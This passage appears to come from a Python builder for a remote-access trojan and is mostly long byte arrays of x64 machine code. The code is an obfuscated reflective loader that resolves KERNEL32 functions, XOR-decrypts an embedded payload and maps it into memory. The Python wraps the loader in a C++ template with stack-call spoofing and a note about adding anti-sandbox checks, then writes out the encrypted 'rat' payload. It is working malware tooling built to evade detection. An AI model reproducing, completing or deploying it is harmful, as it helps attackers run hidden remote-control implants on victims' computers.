24\x90\x00\x00\x00\x48\x03\xC8\x48\x8B\xC1\x48\x89\x44\x24\x68\x48\x8B\x44\x24\x28\x8B\x40\x24\x48\x8B\x8C\x24\x90\x00\x00\x00\x48\x03\xC8\x48\x8B\xC1\x48\x89\x44\x24\x78\x48\x83\xBC\x24\x98\x00\x00\x00\x00\x75\x49\x0F\xB7\x84\x24\xA0\x00\x00\x00\x48\x8B\x4C\x24\x28\x2B\x41\x10\x89\x44\x24\x30\x83\x7C\x24\x30\x00\x72\x29\x8B\x44\x24\x40\x39\x44\x24\x30\x73\x1F\x8B\x44\x24\x30\x48\x8B\x4C\x24\x48\x8B\x04\x81\x48\x8B\x8C\x24\x90\x00\x00\x00\x48\x03\xC8\x48\x8B\xC1\x48\x89\x44\x24\x20\xE9\x86\x00\x00\x00\x48\xC7\x44\x24\x38\x00\x00\x00\x00\xEB\x0D\x48\x8B\x44\x24\x38\x48\xFF\xC0\x48\x89\x44\x24\x38\x8B\x44\x24\x44\x48\x39\x44\x24\x38\x73\x63\x48\x8B\x44\x24\x68\x48\x8B\x4C\x24\x38\x8B\x04\x88\x48\x8B\x8C\x24\x90\x00\x00\x00\x48\x03\xC8\x48\x8B\xC1\x48\x89\x44\x24\x70\x48\x8B\x94\x24\x98\x00\x00\x00\x48\x8B\x4C\x24\x70\xE8\xBE\xFA\xFF\xFF\x85\xC0\x74\x2B\x48\x8B\x44\x24\x78\x48\x8B\x4C\x24\x38\x0F\xB7\x04\x48\x48\x8B\x4C\x24\x48\x8B\x04\x81\x48\x8B\x8C\x24\x90\x00\x00\x00\x48\x03\xC8\x48\x8B\xC1\x48\x89\x44\x24\x20\xEB\x02\xEB\x85\x48\x83\x7C\x24\x20\x00\x74\x2B\x48\x8B\x44\x24\x28\x48\x39\x44\x24\x20\x72\x1F\x8B\x44\x24\x54\x48\x8B\x4C\x24\x28\x48\x03\xC8\x48\x8B\xC1\x48\x39\x44\x24\x20\x73\x09\x48\xC7\x44\x24\x20\x00\x00\x00\x00\x48\x83\x7C\x24\x20\x00\x75\x52\x48\x83\xBC\x24\xA8\x00\x00\x00\x00\x74\x47\x48\x83\xBC\x24\x98\x00\x00\x00\x00\x74\x1E\x48\x8B\x94\x24\x98\x00\x00\x00\x48\x8B\x8C\x24\x90\x00\x00\x00\xFF\x94\x24\xA8\x00\x00\x00\x48\x89\x44\x24\x20\xEB\x1E\x0F\xB7\x84\x24\xA0\x00\x00\x00\x8B\xD0\x48\x8B\x8C\x24\x90\x00\x00\x00\xFF\x94\x24\xA8\x00\x00\x00\x48\x89\x44\x24\x20\x48\x83\xBC\x24\x98\x00\x00\x00\x00\x74\x20\x48\x8B\x8C\x24\x98\x00\x00\x00\xE8\x98\xF9\xFF\xFF\x4C\x8B\xC0\x33\xD2\x48\x8B\x8C\x24\x98\x00\x00\x00\xE8\x76\xFA\xFF\xFF\x90\x48\x8B\x44\x24\x20\x48\x81\xC4\x88\x00\x00\x00\xC3')
                    asm, offset = Obfuscator.OBFASM(refLoader, ratInfo['refLoaderType'])
                    if not asm:
                        return
                    code = f'''#include <iostream>
#include <windows.h>

/*
* 1.x64
* 2.常规: 平台工具集(LLVM (clang-cl))
* 3.C/C++
* 优化: 优化(最大优化(优选速度) (/O2))
*/

using namespace std;

__attribute__((naked)) void RefLoader(PBYTE pBin, size_t binSize, PBYTE pKey) {{
    __asm {{
        {asm}
    }}
}}

// Gadget 不存在或栈帧过小则不会进行栈欺骗调用
PVOID Gadget() {{
    // 扩大栈帧存储函数参数
    volatile char buf[] = "12345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234";
    __asm {{
        {gadgetSig}
    }}
}}

int main() {{
    // 自行抗沙箱
    // 加载 ShellCode 示例
    HANDLE hFile = CreateFileA("Separation.bin", GENERIC_READ, NULL, NULL, OPEN_EXISTING, 0, NULL);
    DWORD binSize = GetFileSize(hFile, NULL);
    PBYTE pBin = (PBYTE)malloc(binSize);
    DWORD readFileSize;
    ReadFile(hFile, pBin, binSize, &readFileSize, NULL);
    CloseHandle(hFile); // 避免 bin 继续被占用
    size_t key = {hex(struct.unpack('<Q', key)[0])};
    if (((int(*)(...))((PBYTE)RefLoader + {offset}))(pBin, binSize, (PBYTE)&key)) {{
        Gadget(); // 防止 Gadget 不存在
    }}
}}'''
                    with open(f'{savePath}\\loader.cpp', 'w', encoding='UTF-8') as f:
                        f.write(code)
                    with open(f'{savePath}\\Separation.bin', 'wb') as f:
                        f.write(rat)
                else:
                    refLoader = bytearray(b'\x48\x83\xEC\x48\x48\xB8\x78\x56\x34\x12\x78\x56\x34\x12\x48\x89\x44\x24\x30\x48\x8D\x44\x24\x30\x48\x89\x44\x24\x28\x48\xB8\x78\x56\x34\x12\x78\x56\x34\x12\x48\x89\x44\x24\x38\x48\xB8\x78\x56\x34\x12\x78\x56\x34\x12\x48\x89\x44\x24\x20\xB8\x01\x00\x00\x00\x48\x6B\xC0\x00\x48\x8B\x4C\x24\x20\x0F\xB6\x04\x01\xB9\x01\x00\x00\x00\x48\x6B\xC9\x00\x48\x8B\x54\x24\x28\x0F\xB6\x0C\x0A\x33\xC1\x0F\xBE\xC0\x83\xF8\x4D\x75\x5C\xB8\x01\x00\x00\x00\x48\x6B\xC0\x01\x48\x8B\x4C\x24\x20\x0F\xB6\x04\x01\xB9\x01\x00\x00\x00\x48\x6B\xC9\x01\x48\x8B\x54\x24\x28\x0F\xB6\x0C\x0A\x33\xC1\x0F\xBE\xC0\x83\xF8\x5A\x75\x2E\xB8\x01\x00\x00\x00\x48\x6B\xC0\x02\x48\x8B\x4C\x24\x20\x0F\xB6\x04\x01\xB9\x01\x00\x00\x00\x48\x6B\xC9\x02\x48\x8B\x54\x24\x28\x0F\xB6\x0C\x0A\x33\xC1\x0F\xBE\xC0\x83\xF8\x78\x74\x12\x48\x8B\x44\x24\x20\x48\xFF\xC0\x48\x89\x44\x24\x20\xE9\x64\xFF\xFF\xFF\x4C\x8B\x44\x24\x28\x48\x8B\x54\x24\x38\x48\x8B\x4C\x24\x20\xE8\x15\x00\x00\x00\x90\x48\x83\xC4\x48\xC3\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\x4C\x89\x44\x24\x18\x48\x89\x54\x24\x10\x48\x89\x4C\x24\x08\x48\x81\xEC\xA8\x01\x00\x00\xC6\x84\x24\x98\x00\x00\x00\x4B\xC6\x84\x24\x99\x00\x00\x00\x45\xC6\x84\x24\x9A\x00\x00\x00\x52\xC6\x84\x24\x9B\x00\x00\x00\x4E\xC6\x84\x24\x9C\x00\x00\x00\x45\xC6\x84\x24\x9D\x00\x00\x00\x4C\xC6\x84\x24\x9E\x00\x00\x00\x33\xC6\x84\x24\x9F\x00\x00\x00\x32\xC6\x84\x24\xA0\x00\x00\x00\x2E\xC6\x84\x24\xA1\x00\x00\x00\x44\xC6\x84\x24\xA2\x00\x00\x00\x4C\xC6\x84\x24\xA3\x00\x00\x00\x4C\xC6\x84\x24\xA4\x00\x00\x00\x00\x33\xD2\x48\x8D\x8C\x24\x98\x00\x00\x00\xE8\x23\x0C\x00\x00\x48\x89\x44\x24\x28\x48\x83\x7C\x24\x28\x00\x75\x7C\xC6\x84\x24\x88\x00\x00\x00\x6B\xC6\x84\x24\x89\x00\x00\x00\x65\xC6\x84\x24\x8A\x00\x00\x00\x72\xC6\x84\x24\x8B\x00\x00\x00\x6E\xC6\x84\x24\x8C\x00\x00\x00\x65\xC6\x84\x24\x8D\x00\x00\x00\x6C\xC6\x84\x24\x8E\x00\x00\x00\x33\xC6\x84\x24\x8F\x00\x00\x00\x32\xC6\x84\x24\x90\x00\x00\x00\x2E\xC6\x84\x24\x91\x00\x00\x00\x64\xC6\x84\x24\x92\x00\x00\x00\x6C\xC6\x84\x24\x93\x00\x00\x00\x6C\xC6\x84\x24\x94\x00\x00\x00\x00\x33\xD2\x48\x8D\x8C\x24\x88\x00\x00\x00\xE8\x9F\x0B\x00\x00\x48\x89\x44\x24\x28\x48\x83\x7C\x24\x28\x00\x75\x05\xE9\x14\x09\x00\x00\xC6\x44\x24\x78\x4C\xC6\x44\x24\x79\x6F\xC6\x44\x24\x7A\x61\xC6\x44\x24\x7B\x64\xC6\x44\x24\x7C\x4C\xC6\x44\x24\x7D\x69\xC6\x44\x24\x7E\x62\xC6\x44\x24\x7F\x72\xC6\x84\x24\x80\x00\x00\x00\x61\xC6\x84\x24\x81\x00\x00\x00\x72\xC6\x84\x24\x82\x00\x00\x00\x79\xC6\x84\x24\x83\x00\x00\x00\x41\xC6\x84\x24\x84\x00\x00\x00\x00\xC6\x84\x24\xC8\x00\x00\x00\x47\xC6\x84\x24\xC9\x00\x00\x00\x65\xC6\x84\x24\xCA\x00\x00\x00\x74\xC6\x84\x24\xCB\x00\x00\x00\x50\xC6\x84\x24\xCC\x00\x00\x00\x72\xC6\x84\x24\xCD\x00\x00\x00\x6F\xC6\x84\x24\xCE\x00\x00\x00\x63\xC6\x84\x24\xCF\x00\x00\x00\x41\xC6\x84\x24\xD0\x00\x00\x00\x64\xC6\x84\x24\xD1\x00\x00\x00\x64\xC6\x84\x24\xD2\x00\x00\x00\x72\xC6\x84\x24\xD3\x00\x00\x00\x65\xC6\x84\x24\xD4\x00\x00\x00\x73\xC6\x84\x24\xD5\x00\x00\x00\x73\xC6\x84\x24\xD6\x00\x00\x00\x00\xC6\x44\x24\x68\x56\xC6\x44\x24\x69\x69\xC6\x44\x24\x6A\x72\xC6\x44\x24\x6B\x74\xC6\x44\x24\x6C\x75\xC6\x44\x24\x6D\x61\xC6\x44\x24\x6E\x6C\xC6\x44\x24\x6F\x41\xC6\x44\x24\x70\x6C\xC6\x44\x24\x71\x6C\xC6\x44\x24\x72\x6F\xC6\x44\x24\x73\x63\xC6\x44\x24\x74\x00\xC6\x84\x24\xB8\x00\x00\x00\x56\xC6\x84\x24\xB9\x00\x00\x00\x69\xC6\x84\x24\xBA\x00\x00\x00\x72\xC6\x84\x24\xBB\x00\x00\x00\x74\xC6\x84\x24\xBC\x00\x00\x00\x75\xC6\x84\x24\xBD\x00\x00\x00\x61\xC6\x84\x24\xBE\x00\x00\x00\x6C\xC6\x84\x24\xBF\x00\x00\x00\x50\xC6\x84\x24\xC0\x00\x00\x00\x72\xC6\x84\x24\xC1\x00\x00\x00\x6F\xC6\x84\x24\xC2\x00\x00\x00\x74\xC6\x84\x24\xC3\x00\x00\x00\x65\xC6\x84\x24\xC4\x00\x00\x00\x63\xC6\x84\x24\xC5\x00\x00\x00\x74\xC6\x84\x24\xC6\x00\x00\x00\x00\xC6\x84\x24\xA8\x00\x00\x00\x47\xC6\x84\x24\xA9\x00\x00\x00\x65\xC6\x84\x24\xAA\x00\x00\x00\x74\xC6\x84\x24\xAB\x00\x00\x00\x50\xC6\x84\x24\xAC\x00\x00\x00\x72\xC6\x84\x24\xAD\x00\x00\x00\x6F\xC6\x84\x24\xAE\x00\x00\x00\x63\xC6\x84\x24\xAF\x00\x00\x00\x65\xC6\x84\x24\xB0\x00\x00\x00\x73\xC6\x84\x24\xB1\x00\x00\x00\x73\xC6\x84\x24\xB2\x00\x00\x00\x48\xC6\x84\x24\xB3\x00\x00\x00\x65\xC6\x84\x24\xB4\x00\x00\x00\x61\xC6\x84\x24\xB5\x00\x00\x00\x70\xC6\x84\x24\xB6\x00\x00\x00\x00\xC6\x44\x24\x58\x48\xC6\x44\x24\x59\x65\xC6\x44\x24\x5A\x61\xC6\x44\x24\x5B\x70\xC6\x44\x24\x5C\x41\xC6\x44\x24\x5D\x6C\xC6\x44\x24\x5E\x6C\xC6\x44\x24\x5F\x6F\xC6\x44\x24\x60\x63\xC6\x44\x24\x61\x00\x45\x33\xC9\x66\x41\xB8\xFF\xFF\x48\x8D\x94\x24\xC8\x00\x00\x00\x48\x8B\x4C\x24\x28\xE8\xD8\x0A\x00\x00\x48\x89\x44\x24\x40\x4C\x8B\x4C\x24\x40\x66\x41\xB8\xFF\xFF\x48\x8D\x54\x24\x78\x48\x8B\x4C\x24\x28\xE8\xBA\x0A\x00\x00\x48\x89\x84\x24\x60\x01\x00\x00\x4C\x8B\x4C\x24\x40\x66\x41\xB8\xFF\xFF\x48\x8D\x54\x24\x68\x48\x8B\x4C\x24\x28\xE8\x99\x0A\x00\x00\x48\x89\x84\x24\x58\x01\x00\x00\x4C\x8B\x4C\x24\x40\x66\x41\xB8\xFF\xFF\x48\x8D\x94\x24\xB8\x00\x00\x00\x48\x8B\x4C\x24\x28\xE8\x75\x0A\x00\x00\x48\x89\x84\x24\x70\x01\x00\x00\x4C\x8B\x4C\x24\x40\x66\x41\xB8\xFF\xFF\x48\x8D\x94\x24\xA8\x00\x00\x00\x48\x8B\x4C\x24\x28\xE8\x51\x0A\x00\x00\x48\x89\x84\x24\x40\x01\x00\x00\x4C\x8B\x4C\x24\x40\x66\x41\xB8\xFF\xFF\x48\x8D\x54\x24\x58\x48\x8B\x4C\x24\x28\xE8\x30\x0A\x00\x00\x48\x89\x84\x24\x50\x01\x00\x00\x48\x83\xBC\x24\x60\x01\x00\x00\x00\x74\x34\x48\x83\x7C\x24\x40\x00\x74\x2C\x48\x83\xBC\x24\x58\x01\x00\x00\x00\x74\x21\x48\x83\xBC\x24\x70\x01\x00\x00\x00\x74\x16\x48\x83\xBC\x24\x50\x01\x00\x00\x00\x74\x0B\x48\x83\xBC\x24\x40\x01\x00\x00\x00\x75\x05\xE9\xDB\x05\x00\x00\xFF\x94\x24\x40\x01\x00\x00\x48\x89\x84\x24\x48\x01\x00\x00\x48\x83\xBC\x24\x48\x01\x00\x00\x00\x75\x05\xE9\xBC\x05\x00\x00\x4C\x8B\x84\x24\xB8\x01\x00\x00\xBA\x08\x00\x00\x00\x48\x8B\x8C\x24\x48\x01\x00\x00\xFF\x94\x24\x50\x01\x00\x00\x48\x89\x84\x24\x00\x01\x00\x00\x48\x83\xBC\x24\x00\x01\x00\x00\x00\x75\x05\xE9\x88\x05\x00\x00\x4C\x8B\x8C\x24\xC0\x01\x00\x00\x4C\x8B\x84\x24\xB8\x01\x00\x00\x48\x8B\x94\x24\x00\x01\x00\x00\x48\x8B\x8C\x24\xB0\x01\x00\x00\xE8\x3C\x07\x00\x00\x48\x8B\x84\x24\x00\x01\x00\x00\x48\x89\x84\x24\x30\x01\x00\x00\x48\x8B\x84\x24\x30\x01\x00\x00\x48\x63\x40\x3C\x48\x8B\x8C\x24\x00\x01\x00\x00\x48\x03\xC8\x48\x8B\xC1\x48\x89\x44\x24\x50\x48\x8B\x44\x24\x50\x0F\xB7\x40\x06\x66\x89\x84\x24\xE0\x00\x00\x00\x48\x8B\x44\x24\x50\x48\x8B\x40\x30\x48\x89\x84\x24\x98\x01\x00\x00\x48\x8B\x44\x24\x50\x8B\x40\x50\x89\x84\x24\x10\x01\x00\x00\xB8\x08\x00\x00\x00\x48\x6B\xC0\x01\x48\x8B\x4C\x24\x50\x8B\x84\x01\x88\x00\x00\x00\x89\x84\x24\x14\x01\x00\x00\xB8\x08\x00\x00\x00\x48\x6B\xC0\x05\x48\x8B\x4C\x24\x50\x8B\x84\x01\x88\x00\x00\x00\x89\x84\x24\x18\x01\x00\x00\x48\x8B\x84\x24\x30\x01\x00\x00\x48\x63\x40\x3C\x4C\x8B\xC0\x33\xD2\x48\x8B\x8C\x24\x30\x01\x00\x00\xE8\xA6\x05\x00\x00\x48\xC7\x84\x24\x20\x01\x00\x00\x00\x00\x00\x00\x48\xC7\x84\x24\x68\x01\x00\x00\x00\x00\x00\x00\x8B\x84\x24\x10\x01\x00\x00\x41\xB9\x04\x00\x00\x00\x41\xB8\x00\x10\x00\x00\x8B\xD0\x33\xC9\xFF\x94\x24\x58\x01\x00\x00\x48\x89\x44\x24\x20\x48\x83\x7C\x24\x20\x00\x75\x05\xE9\x65\x04\x00\x00\xC6\x44\x24\x38\x2E\xC6\x44\x24\x39\x74\xC6\x44\x24\x3A\x65\xC6\x44\x24\x3B\x78\xC6\x44\x24\x3C\x74\xC6\x44\x24\x3D\x00\x48\x8B\x44\x24\x50\x0F\xB7\x40\x14\x48\x8B\x4C\x24\x50\x48\x8D\x44\x01\x18\x48\x89\x84\x24\xF0\x00\x00\x00\x48\xC7\x44\x24\x30\x00\x00\x00\x00\xEB\x0D\x48\x8B\x44\x24\x30\x48\xFF\xC0\x48\x89\x44\x24\x30\x0F\xB7\x84\x24\xE0\x00\x00\x00\x48\x39\x44\x24\x30\x0F\x83\xD8\x00\x00\x00\x48\x6B\x44\x24\x30\x28\x48\x8B\x8C\x24\xF0\x00\x00\x00\x48\x03\xC8\x48\x8B\xC1\x48\x8D\x54\x24\x38\x48\x8B\xC8\xE8\x39\x04\x00\x00\x85\xC0\x74\x3F\x48\x6B\x44\x24\x30\x28\x48\x8B\x8C\x24\xF0\x00\x00\x00\x8B\x44\x01\x0C\x48\x8B\x4C\x24\x20\x48\x03\xC8\x48\x8B\xC1\x48\x89\x84\x24\x20\x01\x00\x00\x48\x6B\x44\x24\x30\x28\x48\x8B\x8C\x24\xF0\x00\x00\x00\x8B\x44\x01\x10\x48\x89\x84\x24\x68\x01\x00\x00\x48\x6B\x44\x24\x30\x28\x48\x8B\x8C\x24\xF0\x00\x00\x00\x8B\x44\x01\x10\x48\x6B\x4C\x24\x30\x28\x48\x8B\x94\x24\xF0\x00\x00\x00\x8B\x4C\x0A\x14\x48\x8B\x94\x24\x00\x01\x00\x00\x48\x03\xD1\x48\x8B\xCA\x48\x6B\x54\x24\x30\x28\x4C\x8B\x84\x24\xF0\x00\x00\x00\x41\x8B\x54\x10\x0C\x4C\x8B\x44\x24\x20\x4C\x03\xC2\x49\x8B\xD0\x48\x89\x94\x24\x80\x01\x00\x00\x44\x8B\xC0\x48\x8B\xD1\x48\x8B\x84\x24\x80\x01\x00\x00\x48\x8B\xC8\xE8\x88\x04\x00\x00\x90\xE9\x08\xFF\xFF\xFF\x48\x83\xBC\x24\x20\x01\x00\x00\x00\x75\x05\xE9\x19\x03\x00\x00\x8B\x84\x24\x14\x01\x00\x00\x48\x8B\x4C\x24\x20\x48\x03\xC8\x48\x8B\xC1\x48\x89\x84\x24\xF8\x00\x00\x00\x48\x8B\x84\x24\xF8\x00\x00\x00\x83\x78\x10\x00\x0F\x84\x6B\x01\x00\x00\x48\x8B\x84\x24\xF8\x00\x00\x00\x8B\x40\x0C\x48\x8B\x4C\x24\x20\x48\x03\xC8\x48\x8B\xC1\x48\x8B\x94\x24\x60\x01\x00\x00\x48\x8B\xC8\xE8\x40\x05\x00\x00\x48\x89\x84\x24\x28\x01\x00\x00\x48\x83\xBC\x24\x28\x01\x00\x00\x00\x75\x05\xE9\xAF\x02\x00\x00\x48\x8B\x84\x24\xF8\x00\x00\x00\x8B\x40\x10\x48\x8B\x4C\x24\x20\x48\x03\xC8\x48\x8B\xC1\x48\x89\x84\x24\xD8\x00\x00\x00\x48\x8B\x84\x24\xD8\x00\x00\x00\x48\x83\x38\x00\x0F\x84\xE4\x00\x00\x00\x48\xC7\x84\x24\x08\x01\x00\x00\x00\x00\x00\x00\x48\x8B\x84\x24\xD8\x00\x00\x00\x48\xB9\x00\x00\x00\x00\x00\x00\x00\x80\x48\x8B\x00\x48\x23\xC1\x48\x85\xC0\x74\x33\x48\x8B\x84\x24\xD8\x00\x00\x00\x48\x8B\x00\x48\x25\xFF\xFF\x00\x00\x4C\x8B\x4C\x24\x40\x44\x0F\xB7\xC0\x33\xD2\x48\x8B\x8C\x24\x28\x01\x00\x00\xE8\x36\x06\x00\x00\x48\x89\x84\x24\x08\x01\x00\x00\xEB\x4C\x48\x8B\x84\x24\xD8\x00\x00\x00\x48\x8B\x00\x48\x8B\x4C\x24\x20\x48\x03\xC8\x48\x8B\xC1\x48\x89\x84\x24\x88\x01\x00\x00\x48\x8B\x84\x24\x88\x01\x00\x00\x48\x83\xC0\x02\x4C\x8B\x4C\x24\x40\x66\x41\xB8\xFF\xFF\x48\x8B\xD0\x48\x8B\x8C\x24\x28\x01\x00\x00\xE8\xE8\x05\x00\x00\x48\x89\x84\x24\x08\x01\x00\x00\x48\x83\xBC\x24\x08\x01\x00\x00\x00\x75\x05\xE9\xC7\x01\x00\x00\x48\x8B\x84\x24\xD8\x00\x00\x00\x48\x8B\x8C\x24\x08\x01\x00\x00\x48\x89\x08\x48\x8B\x84\x24\xD8\x00\x00\x00\x48\x83\xC0\x08\x48\x89\x84\x24\xD8\x00\x00\x00\xE9\x0A\xFF\xFF\xFF\x48\x8B\x84\x24\xF8\x00\x00\x00\x48\x83\xC0\x14\x48\x89\x84\x24\xF8\x00\x00\x00\xE9\x83\xFE\xFF\xFF\x8B\x84\x24\x18\x01\x00\x00\x48\x8B\x4C\x24\x20\x48\x03\xC8\x48\x8B\xC1\x48\x89\x44\x24\x48\x48\x8B\x44\x24\x48\x83\x78\x04\x00\x0F\x84\x1B\x01\x00\x00\x48\x8B\x44\x24\x48\x48\x83\xC0\x08\x48\x89\x84\x24\x38\x01\x00\x00\x48\x8B\x44\x24\x48\x8B\x40\x04\x48\x83\xE8\x08\x33\xD2\xB9\x02\x00\x00\x00\x48\xF7\xF1\x48\x89\x84\x24\xE8\x00\x00\x00\x48\x8B\x84\x24\xE8\x00\x00\x00\x48\x89\x84\x24\x90\x01\x00\x00\x48\x8B\x84\x24\xE8\x00\x00\x00\x48\xFF\xC8\x48\x89\x84\x24\xE8\x00\x00\x00\x48\x83\xBC\x24\x90\x01\x00\x00\x00\x0F\x84\x9D\x00\x00\x00\x48\x8B\x84\x24\x38\x01\x00\x00\x48\x8B\x8C\x24\xE8\x00\x00\x00\x0F\xB7\x04\x48\xC1\xF8\x0C\x83\xF8\x0A\x75\x7C\x48\x8B\x44\x24\x48\x8B\x00\x48\x8B\x4C\x24\x20\x48\x03\xC8\x48\x8B\xC1\x48\x8B\x8C\x24\x38\x01\x00\x00\x48\x8B\x94\x24\xE8\x00\x00\x00\x0F\xB7\x0C\x51\x81\xE1\xFF\x0F\x00\x00\x48\x63\xC9\x48\x8B\x94\x24\x98\x01\x00\x00\x4C\x8B\x44\x24\x20\x4C\x2B\xC2\x49\x8B\xD0\x48\x03\x14\x08\x48\x8B\xC2\x48\x8B\x8C\x24\x38\x01\x00\x00\x48\x8B\x94\x24\xE8\x00\x00\x00\x0F\xB7\x0C\x51\x81\xE1\xFF\x0F\x00\x00\x48\x63\xC9\x48\x8B\x54\x24\x48\x8B\x12\x4C\x8B\x44\x24\x20\x4C\x03\xC2\x49\x8B\xD0\x48\x89\x04\x0A\xE9\x31\xFF\xFF\xFF\x48\x8B\x44\x24\x48\x8B\x40\x04\x48\x8B\x4C\x24\x48\x48\x03\xC8\x48\x8B\xC1\x48\x89\x44\x24\x48\xE9\xD6\xFE\xFF\xFF\x4C\x8D\x8C\x24\x78\x01\x00\x00\x41\xB8\x20\x00\x00\x00\x48\x8B\x94\x24\x68\x01\x00\x00\x48\x8B\x8C\x24\x20\x01\x00\x00\xFF\x94\x24\x70\x01\x00\x00\x85\xC0\x75\x02\xEB\x16\x48\x8B\x44\x24\x50\x8B\x40\x28\x48\x8B\x4C\x24\x20\x48\x03\xC8\x48\x8B\xC1\xFF\xD0\x90\x48\x81\xC4\xA8\x01\x00\x00\xC3\xCC\x48\x89\x4C\x24\x08\x48\x83\xEC\x18\x48\xC7\x04\x24\x00\x00\x00\x00\x48\x83\x7C\x24\x20\x00\x74\x23\x48\x8B\x04\x24\x48\x8B\x4C\x24\x20\x48\x03\xC8\x48\x8B\xC1\x0F\xBE\x00\x85\xC0\x74\x0D\x48\x8B\x04\x24\x48\xFF\xC0\x48\x89\x04\x24\xEB\xDD\x48\x8B\x04\x24\x48\x83\xC4\x18\xC3\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\x48\x89\x54\x24\x10\x48\x89\x4C\x24\x08\x48\x83\xEC\x18\x48\x83\x7C\x24\x20\x00\x74\x6D\x48\x83\x7C\x24\x28\x00\x74\x65\x48\x8B\x44\x24\x20\x0F\xBE\x00\x85\xC0\x74\x30\x48\x8B\x44\x24\x20\x0F\xBE\x00\x48\x8B\x4C\x24\x28\x0F\xBE\x09\x3B\xC1\x75\x1C\x48\x8B\x44\x24\x20\x48\xFF\xC0\x48\x89\x44\x24\x20\x48\x8B\x44\x24\x28\x48\xFF\xC0\x48\x89\x44\x24\x28\xEB\xC4\x48\x8B\x44\x24\x20\x0F\xBE\x00\x48\x8B\x4C\x24\x28\x0F\xBE\x09\x3B\xC1\x75\x09\xC7\x04\x24\x01\x00\x00\x00\xEB\x07\xC7\x04\x24\x00\x00\x00\x00\x8B\x04\x24\xEB\x15\x48\x8B\x44\x24\x28\x48\x39\x44\x24\x20\x75\x07\xB8\x01\x00\x00\x00\xEB\x02\x33\xC0\x48\x83\xC4\x18\xC3\xCC\xCC\xCC\x4C\x89\x44\x24\x18\x89\x54\x24\x10\x48\x89\x4C\x24\x08\x48\x83\xEC\x18\x48\x83\x7C\x24\x20\x00\x74\x38\x48\xC7\x04\x24\x00\x00\x00\x00\xEB\x0B\x48\x8B\x04\x24\x48\xFF\xC0\x48\x89\x04\x24\x48\x8B\x44\x24\x30\x48\x39\x04\x24\x73\x18\x48\x8B\x04\x24\x48\x8B\x4C\x24\x20\x48\x03\xC8\x48\x8B\xC1\x0F\xB6\x4C\x24\x28\x88\x08\xEB\xD2\x48\x8B\x44\x24\x20\x48\x83\xC4\x18\xC3\xCC\xCC\xCC\xCC\x4C\x89\x44\x24\x18\x48\x89\x54\x24\x10\x48\x89\x4C\x24\x08\x48\x83\xEC\x18\x48\x83\x7C\x24\x28\x00\x74\x4D\x48\x83\x7C\x24\x20\x00\x74\x45\x48\xC7\x04\x24\x00\x00\x00\x00\xEB\x0B\x48\x8B\x04\x24\x48\xFF\xC0\x48\x89\x04\x24\x48\x8B\x44\x24\x30\x48\x39\x04\x24\x73\x25\x48\x8B\x04\x24\x48\x8B\x4C\x24\x20\x48\x03\xC8\x48\x8B\xC1\x48\x8B\x0C\x24\x48\x8B\x54\x24\x28\x48\x03\xD1\x48\x8B\xCA\x0F\xB6\x09\x88\x08\xEB\xC5\x48\x8B\x44\x24\x20\x48\x83\xC4\x18\xC3\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\x4C\x89\x4C\x24\x20\x4C\x89\x44\x24\x18\x48\x89\x54\x24\x10\x48\x89\x4C\x24\x08\x48\x83\xEC\x18\x48\xC7\x44\x24\x08\x00\x00\x00\x00\x48\xC7\x04\x24\x00\x00\x00\x00\xEB\x0B\x48\x8B\x04\x24\x48\xFF\xC0\x48\x89\x04\x24\x48\x8B\x44\x24\x30\x48\x39\x04\x24\x73\x58\x48\x8B\x04\x24\x48\x8B\x4C\x24\x20\x48\x03\xC8\x48\x8B\xC1\x0F\xB6\x00\x48\x8B\x4C\x24\x08\x48\x8B\x54\x24\x38\x48\x03\xD1\x48\x8B\xCA\x0F\xB6\x09\x33\xC1\x48\x8B\x0C\x24\x48\x8B\x54\x24\x28\x48\x03\xD1\x48\x8B\xCA\x88\x01\x48\x8B\x44\x24\x08\x48\xFF\xC0\x48\x89\x44\x24\x08\x48\x83\x7C\x24\x08\x08\x75\x09\x48\xC7\x44\x24\x08\x00\x00\x00\x00\xEB\x92\x48\x83\xC4\x18\xC3\xCC\xCC\x48\x89\x54\x24\x10\x48\x89\x4C\x24\x08\x48\x81\xEC\x88\x00\x00\x00\x48\x8B\x8C\x24\x90\x00\x00\x00\xE8\x72\xFD\xFF\xFF\x48\x89\x44\x24\x40\x48\x83\x7C\x24\x40\x04\x76\x17\x48\x8B\x44\x24\x40\x48\x8B\x8C\x24\x90\x00\x00\x00\x48\x03\xC8\x48\x8B\xC1\xC6\x40\xFC\x00\x48\xC7\x44\x24\x30\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x60\x00\x00\x00\x48\x89\x44\x24\x58\x48\x8B\x44\x24\x58\x48\x8B\x40\x18\x48\x89\x44\x24\x60\x48\x8B\x44\x24\x60\x48\x8B\x40\x30\x48\x89\x44\x24\x50\x48\x8B\x44\x24\x50\x48\x89\x44\x24\x28\x48\x8B\x44\x24\x28\x48\x83\xC0\x38\x48\x89\x44\x24\x48\x48\x8B\x44\x24\x48\x0F\xB7\x00\x33\xD2\xB9\x02\x00\x00\x00\x48\xF7\xF1\x48\x83\xE8\x04\x48\x89\x44\x24\x38\x48\x83\x7C\x24\x38\x14\x73\x71\x48\xC7\x44\x24\x20\x00\x00\x00\x00\xEB\x0D\x48\x8B\x44\x24\x20\x48\xFF\xC0\x48\x89\x44\x24\x20\x48\x8B\x44\x24\x38\x48\x39\x44\x24\x20\x73\x1D\x48\x8B\x44\x24\x48\x48\x8B\x40\x08\x48\x8B\x4C\x24\x20\x48\x8B\x54\x24\x20\x0F\xB6\x04\x50\x88\x44\x0C\x68\xEB\xCA\x48\x8B\x44\x24\x38\xC6\x44\x04\x68\x00\x48\x8B\x94\x24\x90\x00\x00\x00\x48\x8D\x4C\x24\x68\xE8\xD3\xFC\xFF\xFF\x85\xC0\x74\x10\x48\x8B\x44\x24\x28\x48\x8B\x40\x10\x48\x89\x44\x24\x30\xEB\x20\x48\x8B\x44\x24\x28\x48\x8B\x00\x48\x89\x44\x24\x28\x48\x8B\x44\x24\x28\x48\x8B\x4C\x24\x50\x48\x39\x08\x0F\x85\x3E\xFF\xFF\xFF\x48\x83\x7C\x24\x30\x00\x75\x1F\x48\x83\xBC\x24\x98\x00\x00\x00\x00\x74\x14\x48\x8B\x8C\x24\x90\x00\x00\x00\xFF\x94\x24\x98\x00\x00\x00\x48\x89\x44\x24\x30\x4C\x8B\x44\x24\